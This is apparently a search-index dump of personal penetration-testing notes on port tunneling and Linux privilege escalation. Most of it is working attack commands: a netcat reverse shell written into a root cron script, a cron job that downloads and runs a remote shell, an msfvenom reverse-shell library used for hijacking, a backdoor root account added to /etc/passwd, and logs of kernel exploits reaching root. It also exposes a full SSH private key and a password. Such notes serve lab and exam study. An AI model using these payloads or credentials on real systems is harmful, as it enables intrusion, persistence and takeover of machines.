Add forword from kali linux port 80 to ip port 80. # bindadress bindport connectaddress connectport 0.0.0.0 80 192.168.11.1 80 Restart RINETD service sudo service rinetd restart Checking running service at port 80 ss -antp | grep 80 SSH Tunneling Local Forwarding ssh -N -L [ bind_address: ] port:host:hostport [ username@address ] -N Don't need to execute code -L Local forward 0.0.0.0:80 Bind port 80 at Kali Machine 10.10.10.9:80 Forward traffic to target IP hades@192.168.11.133 Compromised machine sudo ssh -N -L 0 .0.0.0:9001:10.10.10.10:8080 hades@192.168.11.133 -i ./.ssh/id_rsa Remote Forwarding ssh -N -R [ bind_address: ] port:host:hostport [ username@address ] ssh -N -R 0 .0.0.0:9001:10.10.10.10:80 kali@myip -i /home/hades/.ssh/kali-idrsa Dynamic Forwarding ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address> ssh -N -D 127 .0.0.1:9001 hades@192.168.11.135 -i .ssh/id_rsa /etc/proxychains.conf socks4 127.0.0.1 9001 Using proxychains to use the proxy proxychains smbclient -L 192 .168.35.129 sudo proxychains nmap --top-ports = 5 -Pn -sT 192 .168.35.129 Plink.exe plink.exe -ssh -l user -pw passwd -R 0 .0.0.0:9001:needed-access-ip:12345 myip Answer command trick using echo cmd.exe /c echo y | plink.exe -ssh -l user -pw passwd -R 0.0.0.0:9001:needed-access-ip:12345 myip NetSH netsh interface portproxy add v4tov4 listenport = 9001 listenaddress = 0 .0.0.0 connectport = 12345 connectaddress = 192 .168.11.1 netstat -anp TCP | find \"9001\" Adding a firewall rule to allow inbound connections on port 9001 netsh advfirewall firewall add rule name = \"forward_port_rule\" protocol = TCP dir = in localip = 192 .168.11.135 localport = 9001 action = allow HTTPTunnel-ing Redirect traffic of RDP at 192.168.11.135 to local at port 8888 ssh -L 0 .0.0.0:8888:192.168.11.135:3389 hades@127.0.0.1 ss -antp | grep \"8888\" Redirect all traffic to http protocol. hts --forward-port localhost:8888 1234 hts --forward-port 192 .168.35.129:3389 1234 ps aux | grep hts At Kali machine, redirect RDP protocol to http protocol htc --forward-port 8080 192 .168.11.133:1234","title":"Redirec & Tunnel"},{"location":"red-teaming/network-pentest/port-redirection-tunneling/#port-redirection-tunneling","text":"","title":"Port Redirection &amp; Tunneling"},{"location":"red-teaming/network-pentest/port-redirection-tunneling/#port-redirection","text":"","title":"Port Redirection"},{"location":"red-teaming/network-pentest/port-redirection-tunneling/#rinetd","text":"nano /etc/rinetd.conf Add forword from kali linux port 80 to ip port 80. # bindadress bindport connectaddress connectport 0.0.0.0 80 192.168.11.1 80 Restart RINETD service sudo service rinetd restart Checking running service at port 80 ss -antp | grep 80","title":"RINETD"},{"location":"red-teaming/network-pentest/port-redirection-tunneling/#ssh-tunneling","text":"","title":"SSH Tunneling"},{"location":"red-teaming/network-pentest/port-redirection-tunneling/#local-forwarding","text":"ssh -N -L [ bind_address: ] port:host:hostport [ username@address ] -N Don't need to execute code -L Local forward 0.0.0.0:80 Bind port 80 at Kali Machine 10.10.10.9:80 Forward traffic to target IP hades@192.168.11.133 Compromised machine sudo ssh -N -L 0 .0.0.0:9001:10.10.10.10:8080 hades@192.168.11.133 -i ./.ssh/id_rsa","title":"Local Forwarding"},{"location":"red-teaming/network-pentest/port-redirection-tunneling/#remote-forwarding","text":"ssh -N -R [ bind_address: ] port:host:hostport [ username@address ] ssh -N -R 0 .0.0.0:9001:10.10.10.10:80 kali@myip -i /home/hades/.ssh/kali-idrsa","title":"Remote Forwarding"},{"location":"red-teaming/network-pentest/port-redirection-tunneling/#dynamic-forwarding","text":"ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address> ssh -N -D 127 .0.0.1:9001 hades@192.168.11.135 -i .ssh/id_rsa /etc/proxychains.conf socks4 127.0.0.1 9001 Using proxychains to use the proxy proxychains smbclient -L 192 .168.35.129 sudo proxychains nmap --top-ports = 5 -Pn -sT 192 .168.35.129","title":"Dynamic Forwarding"},{"location":"red-teaming/network-pentest/port-redirection-tunneling/#plinkexe","text":"plink.exe -ssh -l user -pw passwd -R 0 .0.0.0:9001:needed-access-ip:12345 myip Answer command trick using echo cmd.exe /c echo y | plink.exe -ssh -l user -pw passwd -R 0.0.0.0:9001:needed-access-ip:12345 myip","title":"Plink.exe"},{"location":"red-teaming/network-pentest/port-redirection-tunneling/#netsh","text":"netsh interface portproxy add v4tov4 listenport = 9001 listenaddress = 0 .0.0.0 connectport = 12345 connectaddress = 192 .168.11.1 netstat -anp TCP | find \"9001\" Adding a firewall rule to allow inbound connections on port 9001 netsh advfirewall firewall add rule name = \"forward_port_rule\" protocol = TCP dir = in localip = 192 .168.11.135 localport = 9001 action = allow","title":"NetSH"},{"location":"red-teaming/network-pentest/port-redirection-tunneling/#httptunnel-ing","text":"Redirect traffic of RDP at 192.168.11.135 to local at port 8888 ssh -L 0 .0.0.0:8888:192.168.11.135:3389 hades@127.0.0.1 ss -antp | grep \"8888\" Redirect all traffic to http protocol. hts --forward-port localhost:8888 1234 hts --forward-port 192 .168.35.129:3389 1234 ps aux | grep hts At Kali machine, redirect RDP protocol to http protocol htc --forward-port 8080 192 .168.11.133:1234","title":"HTTPTunnel-ing"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/","text":"Linux Privilege Escalation Upgrade Shell PayloadsAllTheThings: Spawn TTY Shell Spawning a TTY Shell python script perl ruby os.system sh -i lua In an editor python3 -c 'import pty; pty.spawn(\"/bin/sh\")' python3 -c 'import pty; pty.spawn(\"/usr/bin/sh\")' python3 -c 'import pty; pty.spawn(\"/bin/zsh\")' python3 -c 'import pty; pty.spawn(\"/bin/bash\")' python -c 'import pty; pty.spawn(\"/bin/sh\")' /usr/bin/script -qc /bin/sh /dev/null perl -e 'exec \"/bin/sh\";' perl: exec \"/bin/sh\" ; ruby: exec \"/bin/sh\" echo os.system ( '/bin/bash' ) /bin/sh -i lua: os.execute ( '/bin/sh' ) (From within IRB) exec \"/bin/sh\" (From within vi) :!bash (From within vi) :set shell = /bin/bash:shell (From within nmap) !sh Nice Terminal export TERM = xterm ^Z stty raw -echo ; fg stty rows 42 columns 172 User Enumeration Current User hostname && whoami && id Which ones have a valid shell grep -vE \"nologin|false\" /etc/passwd Folder pwd ; ls -la OS & Architecture & Kernel Kernel version and Architecture uname -a cat /etc/issue ; uname -r ; arch What's the OS? cat /etc/*-release lsb_release -a ( Debian based OSs ) Drivers & Kernel Modules lsmod /sbin/modinfo <name> Compile exploit in C/C++ Compile file File Size.c $ gcc -m32 Size.c -o x86-S $ ./x86-S Size = 4 $ gcc Size.c -o x64-S $ ./x64-S Size = 8 #include <stdio.h> int main () { printf ( \"Size = %lu\" , sizeof ( size_t )); } <= 2.6.36-rc8 - 'RDS Protocol' www-data@ip:/tmp$ uname -a Linux ip 2 .6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux https://fareedfauzi.gitbook.io/oscp-notes/linux-post-exploitation/linux-exploitation#exploits-worth-running https://www.exploit-db.com/raw/15285 gcc -m32 15285 .c -o 15285 www-data@ip:/tmp$ ./15285 [ * ] Linux kernel > = 2 .6.30 RDS socket exploit [ * ] by Dan Rosenberg [ * ] Resolving kernel addresses... [ + ] Resolved security_ops to 0xc08c8c2c [ + ] Resolved default_security_ops to 0xc0773300 [ + ] Resolved cap_ptrace_traceme to 0xc02f3dc0 [ + ] Resolved commit_creds to 0xc016dcc0 [ + ] Resolved prepare_kernel_cred to 0xc016e000 [ * ] Overwriting security ops... [ * ] Overwriting function pointer... [ * ] Triggering payload... [ * ] Restoring function pointer... [ * ] Got root! # id uid = 0 ( root ) gid = 0 ( root ) <= 2.6.37 'Full-Nelson. www-data@popcorn:/home/george$ uname -a Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux www-data@popcorn:/home/george$ cat /etc/issue cat /etc/issue Ubuntu 9.10 \\n \\l https://www.exploit-db.com/exploits/15704 www-data@popcorn:/var/www$ gcc 15704.c -o 15704 gcc 15704.c -o 15704 www-data@popcorn:/var/www$ chmod +x 15704 chmod +x 15704 www-data@popcorn:/var/www$ ./15704 ./15704 [*] Resolving kernel addresses... [+] Resolved econet_ioctl to 0xf846a280 [+] Resolved econet_ops to 0xf846a360 [+] Resolved commit_creds to 0xc01645d0 [+] Resolved prepare_kernel_cred to 0xc01647d0 [*] Calculating target... [*] Failed to set Econet address. [*] Triggering payload... [*] Got root! # whoami whoami root # 2.6.39 < 3.2.2 (x86/x64) www-data@hades:/tmp$ uname -a Linux hades 3 .0.0-12-server #20-Ubuntu SMP Fri Oct 7 16:36:30 UTC 2011 x86_64 x86_64 x86_64 GNU/Linux https://www.exploit-db.com/exploits/35161 www-data@hades:/tmp$ ./35161 =============================== = Mempodipper = = by zx2c4 = = Jan 21 , 2012 = =============================== [ + ] Ptracing su to find next instruction without reading binary. [ + ] Creating ptrace pipe. [ + ] Forking ptrace child. [ + ] Waiting for ptraced child to give output on syscalls. [ + ] Ptrace_traceme ' ing process. [ + ] Error message written. Single stepping to find address. [ + ] Resolved call address to 0x401ce8. [ + ] Opening socketpair. [ + ] Waiting for transferred fd in parent. [ + ] Executing child from child fork. [ + ] Opening parent mem /proc/2338/mem in child. [ + ] Sending fd 6 to parent. [ + ] Received fd at 6 . [ + ] Assigning fd 6 to stderr. [ + ] Calculating su padding. [ + ] Seeking to offset 0x401cdc. [ + ] Executing su with shellcode. # id uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) ,33 ( www-data ) Processes and Services ps axu How to check if port is in use in sudo lsof -i -P -n | grep LISTEN List all enabled services from systemctl systemctl list-unit-files | grep enabled Active network connection ss -anp netstat -antup Binaries That AutoElevate find / -perm -u = s -type f -exec ls -l {} \\; 2 >/dev/null sudo in linux Check sudo access $ sudo -l [ sudo ] password for Hades: Matching Defaults entries for pentesterlab on 7358cafc3ebe: secure_path = /usr/local/sbin \\: /usr/local/bin \\: /usr/sbin \\: /usr/bin \\: /sbin \\: /bin User Hades may run the following commands: ( victim ) /bin/bash Mix cp/chown and chmod https://www.adampalmer.me/iodigitalsec/2009/10/03/linux-c-setuid-setgid-tutorial https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries sudo -l Matching Defaults entries for Hades: secure_path = /usr/local/sbin \\: /usr/local/bin \\: /usr/sbin \\: /usr/bin \\: /sbin \\: /bin User Hades may run the following commands: ( victim ) /bin/chmod, /bin/cp Readable/Writable find / -writable -type d 2 >/dev/null find / -writable 2 >/dev/null File /etc/passwd File /etc/passwd can be modify by user permission. ls -l /etc/passwd $ openssl passwd Password: Verifying - Password: QzKsrWCYxmRPY QzKsrWCYxmRPY : non password hash. sed 's/root:x:/root:QzKsrWCYxmRPY:/' /etc/passwd > passwd cat passwd > /etc/passwd su Generate password for new user openssl passwd -1 -salt hades leecybersec Credential: toor / leecybersec echo 'toor:$1$hades$KKCtexC.plAyjcJkX7War0:0:0:root:/root:/bin/sh' >> /etc/passwd https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation Scheduled Tasks ls -lah /etc/cron* cat /etc/crontab grep \"CRON\" /var/log/* 2 >/dev/null Cronjob file insecure Cronjob file check.sh overwrite, file check.sh running as root every 1 minute. ls -l check.sh -rw-rw-rw- 1 root root <snip> check.sh Can change file check.sh with user permission. echo \"rm /tmp/f; mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f\" >> check.sh PATH Search Order Crontab $ cat /etc/crontab <snip> SHELL = /bin/sh PATH = /usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user command */5 * * * * root cd / && run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly ) # ==> PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin chloe@roquefort:~$ ls -ld /usr/local/bin drwxrwsrwx 2 root staff 4096 Apr 24 2020 /usr/local/bin cp /tmp/shell /usr/local/bin/run-parts https://crontab.guru : */5 : \"At every 5th minute.\" $ sudo nc -nvlp 22 listening on [ any ] 22 ... connect to [ ip ] from ( UNKNOWN ) [ ip ] 37228 id uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) Module Import Hijacking Dynamic Library Hijacking SHELL = /bin/bash PATH = /sbin:/bin:/usr/sbin:/usr/bin LD_LIBRARY_PATH = /usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils MAILTO = \"\" <snip> * * * * * root /usr/bin/log-sweeper ==> LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils [ hades@hades ~ ] $ ls -ld /usr/local/lib/dev drwxrwxrwx 2 root root 6 Sep 7 2020 /usr/local/lib/dev [ hades@hades ~ ] $ ls -l /usr/bin/log-sweeper -rwxr-xr-x. 1 root root 8800 Sep 4 2020 /usr/bin/log-sweeper [ hades@hades ~ ] $ /usr/bin/log-sweeper /usr/bin/log-sweeper: error while loading shared libraries: utils.so: cannot open shared object file: No such file or directory exploit msfvenom -p linux/x64/shell_reverse_tcp LHOST = 192 .168.49.158 LPORT = 6379 -f elf-so > utils.so [ hades@hades dev ] $ chmod 777 utils.so [ hades@hades dev ] $ pwd /usr/local/lib/dev $ sudo nc -nvlp 6379 listening on [ any ] 6379 ... connect to [ ip ] from ( UNKNOWN ) [ ip ] 55124 id uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) Python Module Hijacking $ cat python . py #!/usr/bin/python import sys try : import controller except Exception : print \"[!] ERROR: Unable to load controller module.\" sys . exit () controller module not found. Create file controller.py and add malicious python code. echo 'import os;os.system(\"chmod 777 /etc/passwd\")' > controller.py Docker container Check being a container root@315d7648a173:/# ls -lah <snip> -rwxr-xr-x 1 root root 0 Jun 9 13 :01 .dockerenv Mount disk to docker machine. mkdir -p /mnt/hola mount /dev/sda1 /mnt/hola mount /dev/sda2 /mnt/hola mount /dev/sda3 /mnt/hola After mounted Add cron job: https://github.com/MauroEldritch/GEVAUDAN/blob/master/gevaudan.rb /sbin/mount.glusterfs ip:/gluster_shared_storage /tmp/x echo '* * * * * root /bin/bash -c \"/usr/bin/wget http://ip/shell -O /tmp/shell && chmod 777 /tmp/shell && /tmp/shell\"' > /tmp/x/snaps/gcron_enabled Change root directory mkdir /hdd && mount /dev/sda1 /hdd && chroot /hdd Add ssh public key Gen key id_rsa.pub id_rsa ssh-keygen -t rsa echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAA ...key...' > /mnt/hola/root/.ssh/authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+SK1375peajAYzOZIWV/zjsUPDs9+hxk5Ggo+cKAQKg3uImvEmQtuJKrygU03RE8EVtPw5HuViM70NLVLK2H4iSkUSSp33nWkIq1kz0yJksiKjlx2h0eXzBwQ7zeymFNr4oRvpigwEXnScOY39040h3xTqa7RikYVP4h25TtfhNExVtaZRzO6dDJSTTZurg81lkwvILHY9vw77TBP1Vsa4htYcufPKoxUDId3JllPO7Q6UTjGvlLjVf0az9Q0Kpe/D3PsAM/Wn+gCbsBkzgJ1Jhx+BFbakXto3mgdGsh3fbOLsFTX8+XTLaZNFa/faIOwUcVPvteJ2gRGe2QT6A5WV53ql3uoBnNEBwkndrWtDXyKDhPdYQXrDGZc3x2GMuM2LGkZKpM3CKv7JvUhvMj/J76380khYhFj1COOfUeQPjUmuB4Kyo5ZTDfkNXrP2CirrnGiKMOv/3hHbTSlP9t0eVQdeMQfL98NwZyRwMh9c3vQEh29PJc+BflSRJRyZhE= leecybersec@kali -----BEGIN OPENSSH PRIVATE KEY----- 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 -----END OPENSSH PRIVATE KEY----- Installed and Patch Levels dpkg -l ( Debian based OSs ) rpm -qa ( CentOS / openSUSE ) uname -a Networking Enumeration Interface and Routable ip a /sbin/route Firewall and Rules grep -Hs iptables /etc/* Unmounted Disks List all mounted files system mount cat /etc/fstab List all disk /bin/lsblk Mount disk sudo mount -o nolock 192 .168.11.131:/share ~/share Enumeration Tools Basic Linux Privilege Escalation https://gtfobins.github.io https://github.com/DominicBreuker/pspy https://github.com/rebootuser/LinEnum https://github.com/diego-treitos/linux-smart-enumeration http://pentestmonkey.net/tools/audit/unix-privesc-check More Commands history, bashrc, backup find / -name *history* 2 >/dev/null find / -name *backup* 2 >/dev/null find / -name *bashrc* -exec grep passwod {} \\; 2 >/dev/null Port Tunneling Local Tunneling ssh -L $myport :127.0.0.1:5985 hades@192.168.11.133 -i id_rsa Remote Tunneling ssh -R $myip : $myport :127.0.0.1:5985 kali@ $myip -i kali-idrsa SSH ESCAPE CHARACTERS ~C to type ssh command Generate SSH Key ssh-keygen -t rsa cp id_rsa.pub authorized_keys Add user to sudo Create user:pass echo -e \"pass\\pass\" | adduser --gecos \"\" user usermod -aG sudo user sudo su - user","title":"Unix&Linux"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#linux-privilege-escalation","text":"","title":"Linux Privilege Escalation"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#upgrade-shell","text":"PayloadsAllTheThings: Spawn TTY Shell","title":"Upgrade Shell"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#spawning-a-tty-shell","text":"python script perl ruby os.system sh -i lua In an editor python3 -c 'import pty; pty.spawn(\"/bin/sh\")' python3 -c 'import pty; pty.spawn(\"/usr/bin/sh\")' python3 -c 'import pty; pty.spawn(\"/bin/zsh\")' python3 -c 'import pty; pty.spawn(\"/bin/bash\")' python -c 'import pty; pty.spawn(\"/bin/sh\")' /usr/bin/script -qc /bin/sh /dev/null perl -e 'exec \"/bin/sh\";' perl: exec \"/bin/sh\" ; ruby: exec \"/bin/sh\" echo os.system ( '/bin/bash' ) /bin/sh -i lua: os.execute ( '/bin/sh' ) (From within IRB) exec \"/bin/sh\" (From within vi) :!bash (From within vi) :set shell = /bin/bash:shell (From within nmap) !sh","title":"Spawning a TTY Shell"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#nice-terminal","text":"export TERM = xterm ^Z stty raw -echo ; fg stty rows 42 columns 172","title":"Nice Terminal"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#user-enumeration","text":"Current User hostname && whoami && id Which ones have a valid shell grep -vE \"nologin|false\" /etc/passwd Folder pwd ; ls -la","title":"User Enumeration"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#os-architecture-kernel","text":"Kernel version and Architecture uname -a cat /etc/issue ; uname -r ; arch What's the OS? cat /etc/*-release lsb_release -a ( Debian based OSs ) Drivers & Kernel Modules lsmod /sbin/modinfo <name>","title":"OS &amp; Architecture &amp; Kernel"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#compile-exploit-in-cc","text":"Compile file File Size.c $ gcc -m32 Size.c -o x86-S $ ./x86-S Size = 4 $ gcc Size.c -o x64-S $ ./x64-S Size = 8 #include <stdio.h> int main () { printf ( \"Size = %lu\" , sizeof ( size_t )); }","title":"Compile exploit in C/C++"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#2636-rc8-rds-protocol","text":"www-data@ip:/tmp$ uname -a Linux ip 2 .6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux https://fareedfauzi.gitbook.io/oscp-notes/linux-post-exploitation/linux-exploitation#exploits-worth-running https://www.exploit-db.com/raw/15285 gcc -m32 15285 .c -o 15285 www-data@ip:/tmp$ ./15285 [ * ] Linux kernel > = 2 .6.30 RDS socket exploit [ * ] by Dan Rosenberg [ * ] Resolving kernel addresses... [ + ] Resolved security_ops to 0xc08c8c2c [ + ] Resolved default_security_ops to 0xc0773300 [ + ] Resolved cap_ptrace_traceme to 0xc02f3dc0 [ + ] Resolved commit_creds to 0xc016dcc0 [ + ] Resolved prepare_kernel_cred to 0xc016e000 [ * ] Overwriting security ops... [ * ] Overwriting function pointer... [ * ] Triggering payload... [ * ] Restoring function pointer... [ * ] Got root! # id uid = 0 ( root ) gid = 0 ( root )","title":"&lt;= 2.6.36-rc8 - 'RDS Protocol'"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#2637-full-nelson","text":"www-data@popcorn:/home/george$ uname -a Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux www-data@popcorn:/home/george$ cat /etc/issue cat /etc/issue Ubuntu 9.10 \\n \\l https://www.exploit-db.com/exploits/15704 www-data@popcorn:/var/www$ gcc 15704.c -o 15704 gcc 15704.c -o 15704 www-data@popcorn:/var/www$ chmod +x 15704 chmod +x 15704 www-data@popcorn:/var/www$ ./15704 ./15704 [*] Resolving kernel addresses... [+] Resolved econet_ioctl to 0xf846a280 [+] Resolved econet_ops to 0xf846a360 [+] Resolved commit_creds to 0xc01645d0 [+] Resolved prepare_kernel_cred to 0xc01647d0 [*] Calculating target... [*] Failed to set Econet address. [*] Triggering payload... [*] Got root! # whoami whoami root #","title":"&lt;= 2.6.37 'Full-Nelson."},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#2639-322-x86x64","text":"www-data@hades:/tmp$ uname -a Linux hades 3 .0.0-12-server #20-Ubuntu SMP Fri Oct 7 16:36:30 UTC 2011 x86_64 x86_64 x86_64 GNU/Linux https://www.exploit-db.com/exploits/35161 www-data@hades:/tmp$ ./35161 =============================== = Mempodipper = = by zx2c4 = = Jan 21 , 2012 = =============================== [ + ] Ptracing su to find next instruction without reading binary. [ + ] Creating ptrace pipe. [ + ] Forking ptrace child. [ + ] Waiting for ptraced child to give output on syscalls. [ + ] Ptrace_traceme ' ing process. [ + ] Error message written. Single stepping to find address. [ + ] Resolved call address to 0x401ce8. [ + ] Opening socketpair. [ + ] Waiting for transferred fd in parent. [ + ] Executing child from child fork. [ + ] Opening parent mem /proc/2338/mem in child. [ + ] Sending fd 6 to parent. [ + ] Received fd at 6 . [ + ] Assigning fd 6 to stderr. [ + ] Calculating su padding. [ + ] Seeking to offset 0x401cdc. [ + ] Executing su with shellcode. # id uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) ,33 ( www-data )","title":"2.6.39 &lt; 3.2.2 (x86/x64)"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#processes-and-services","text":"ps axu How to check if port is in use in sudo lsof -i -P -n | grep LISTEN List all enabled services from systemctl systemctl list-unit-files | grep enabled","title":"Processes and Services"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#active-network-connection","text":"ss -anp netstat -antup","title":"Active network connection"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#binaries-that-autoelevate","text":"find / -perm -u = s -type f -exec ls -l {} \\; 2 >/dev/null","title":"Binaries That AutoElevate"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#sudo-in-linux","text":"","title":"sudo in linux"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#check-sudo-access","text":"$ sudo -l [ sudo ] password for Hades: Matching Defaults entries for pentesterlab on 7358cafc3ebe: secure_path = /usr/local/sbin \\: /usr/local/bin \\: /usr/sbin \\: /usr/bin \\: /sbin \\: /bin User Hades may run the following commands: ( victim ) /bin/bash Mix cp/chown and chmod https://www.adampalmer.me/iodigitalsec/2009/10/03/linux-c-setuid-setgid-tutorial https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries sudo -l Matching Defaults entries for Hades: secure_path = /usr/local/sbin \\: /usr/local/bin \\: /usr/sbin \\: /usr/bin \\: /sbin \\: /bin User Hades may run the following commands: ( victim ) /bin/chmod, /bin/cp","title":"Check sudo access"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#readablewritable","text":"find / -writable -type d 2 >/dev/null find / -writable 2 >/dev/null","title":"Readable/Writable"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#file-etcpasswd","text":"File /etc/passwd can be modify by user permission. ls -l /etc/passwd $ openssl passwd Password: Verifying - Password: QzKsrWCYxmRPY QzKsrWCYxmRPY : non password hash. sed 's/root:x:/root:QzKsrWCYxmRPY:/' /etc/passwd > passwd cat passwd > /etc/passwd su Generate password for new user openssl passwd -1 -salt hades leecybersec Credential: toor / leecybersec echo 'toor:$1$hades$KKCtexC.plAyjcJkX7War0:0:0:root:/root:/bin/sh' >> /etc/passwd https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation","title":"File /etc/passwd"},{"location":"red-teaming/network-pentest/privilege-escalation/Unix%26Linux/#scheduled-tasks","text":"ls -lah /etc/cron* cat /etc/crontab grep \"CRON\" /var/log/* 2 >/dev/null","title":"Scheduled 